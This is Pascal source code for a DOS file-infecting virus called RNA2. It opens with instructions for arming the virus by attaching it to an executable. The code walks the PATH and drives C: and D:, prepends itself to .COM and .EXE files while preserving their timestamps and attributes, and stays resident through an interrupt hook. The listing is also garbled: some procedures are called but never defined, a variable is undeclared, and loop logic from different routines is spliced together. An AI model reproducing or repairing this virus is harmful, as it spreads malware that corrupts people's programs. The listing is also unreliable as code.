{
To make RNA2 active copy it to the front of an executable file (*.com,*.exe).
You can use the copy command with the /b switch like so:

COPY /B RNA2.EXE+FILENAME.EXT FILE2.EXT

Filename is the name of the executable file to attach it to, File2 is the name
of the combined files.  File2 is now ready to be run.

}

{$i-}{$m 2048,0,24576}
Program RNA;

uses dos;

const blksize=8192;
      vsize=7200;
      wc='*.';
      counter=blksize-1;
      cb=':\';
      maxinf:byte=4;
      maxruns:byte=48;
      drives:array[3..4] of char=('C','D');
      imf:string[12]='ux142.rqz';


type vtype=array[1..vsize] of byte;
     buftype=array[1..blksize] of byte;

var ps:string;
    s:pathstr;
    ds:dirstr;
    ns:namestr;
    es:extstr;
    v:^vtype;
    buf:^buftype;
    count,indx,inf:byte;
    attr,nr,nw:word;
    sr:searchrec;
    f,f2:file;
    t:longint;

procedure copyf;
begin
 repeat
  blockread(f,buf^,blksize,nr);
  blockwrite(f2,buf^,nr,nw);
 until (eof(f));
 close(f);
 setftime(f2,t);
 close(f2);
end;

Procedure stripf;

begin
 assign(f,s);
 reset(f,1);
 getftime(f,t);
 assign(f2,ds+imf);
 rewrite(f2,1);
 seek(f,vsize);
 copyf;
end;

procedure load;

begin
 assign(f,s);
 getfattr(f,attr);
 reset(f,1);
 if ioresult=0 then
  begin
   getftime(f,t);
   blockread(f,v^,vsize,nr);
   count:=v^[vsize]-1;
   v^[vsize]:=maxruns;
   seek(f,vsize-1);
   blockwrite(f,count,1,nr);
   setftime(f,t);
   close(f);
   setfattr(f,attr);
  end;
end;

function checkf(pth:dirstr):boolean;

var by:array[1..27] of byte;

begin
 checkf:=false;
 if pos(sr.name,'COMMAND.COM')=0 then
 begin
  assign(f,pth+sr.name);
  reset(f,1);
  if ioresult=0 then
   begin
    blockread(f,by,27,nr);
    for indx:=1 to 27 do
     if (by[indx])<>(v^[indx]) then
      checkf:=true;
    close(f);
   end;
 end;
end;

procedure attach(pth:dirstr);
begin
 inc(inf);
 assign(f2,pth+'zSqA.th');
 rewrite(f2,1);
 if ioresult=0 then
  begin
   assign(f,pth+sr.name);
   getfattr(f,attr);
   reset(f,1);
   getftime(f,t);
   blockwrite(f2,v^,vsize,nr);
   copyf;
   erase(f);
   rename(f2,sr.name);
   setfattr(f2,attr);
  end;
end;

procedure rep(pth:dirstr;ext:extstr);

begin
 findfirst(pth+wc+ext,hidden+archive+readonly,sr);
 while (inf<>'') do
  begin
   indx:=pos(';',ps);
   if indx=0 then
    begin
     tmp:=ps;
     ps:='';
    end
   else
    begin
     tmp:=copy(ps,1,indx-1);
     ps:=copy(ps,indx+1,length(ps)-indx);
    end;
   if tmp[length(tmp)]<>'\' then tmp:=tmp+'\';
   rep(tmp,'cOm');
   rep(tmp,'exE');
  end;
end;

procedure makep;

var b:byte;

begin
 getdir(0,ps);
 for b:=3 to 4 do
  begin
   ps:=ps+';'+drives[b]+cb+';';
   findfirst(drives[b]+cb+wc,directory,sr);
   while (doserror=0) and (length(ps)<240) do
    begin
     ps:=ps+drives[b]+cb+sr.name+';';
     findnext(sr);
    end;
  end;
end;

procedure grow;

begin
 inf:=0;
 ps:=getenv('path');
 if ps<>'' then replicate;
 if inf<3 then
  begin
   t:=0;
   setintvec($1c,@wastetime);
   keep(0);
  end;
end.

